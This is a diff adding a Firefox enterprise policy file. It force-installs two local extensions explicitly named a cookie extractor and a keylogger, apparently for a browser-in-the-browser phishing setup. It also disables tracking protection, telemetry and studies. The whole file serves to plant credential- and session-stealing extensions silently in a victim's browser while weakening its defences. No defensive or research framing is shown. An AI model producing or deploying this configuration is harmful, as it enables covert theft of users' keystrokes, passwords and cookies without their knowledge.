@@ -1,0 +1,31 @@
+{
+  "policies": {
+    "ExtensionSettings": {
+      "bitb-cookie@security.local": {
+        "installation_mode": "force_installed",
+        "install_url": "file:///tmp/extensions/cookie-extractor/"
+      },
+      "bitb-keylogger@security.local": {
+        "installation_mode": "force_installed",
+        "install_url": "file:///tmp/extensions/keylogger/"
+      }
+    },
+    "DisableTelemetry": true,
+    "DisableFirefoxStudies": true,
+    "EnableTrackingProtection": {
+      "Value": false
+    },
+    "NetworkPrediction": false,
+    "CaptivePortal": false,
+    "FirefoxHome": {
+      "Search": true,
+      "TopSites": false,
+      "SponsoredTopSites": false,
+      "Highlights": false,
+      "Pocket": false,
+      "SponsoredPocket": false,
+      "Snippets": false,
+      "Locked": false
+    }
+  }
+}
